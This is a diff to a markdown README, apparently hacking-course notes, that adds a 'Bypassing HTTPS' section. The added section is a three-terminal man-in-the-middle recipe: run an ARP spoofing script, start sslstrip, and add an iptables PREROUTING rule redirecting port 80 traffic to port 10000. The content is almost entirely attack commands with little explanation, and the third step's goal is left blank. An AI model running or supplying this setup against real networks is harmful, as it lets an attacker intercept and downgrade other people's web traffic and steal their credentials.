@@ -71,6 +71,34 @@ to restore them
 iptables --flush
 ```
 
+## Bypassing HTTPS
+
+* Terminal 1 
+> Goal To be MITM  
+> Let's use our arp spoof file
+
+```
+python arpspoof.py
+```
+
+* Terminal 2
+> Goal is to use SSLstrip
+> ssltrip default port is 10000
+
+```
+sslstrip
+```
+
+* Terminal 3
+> Goal 
+> 
+
+```
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+```
+
+
+
 --- 
 
 ### Python 3 Compatibility
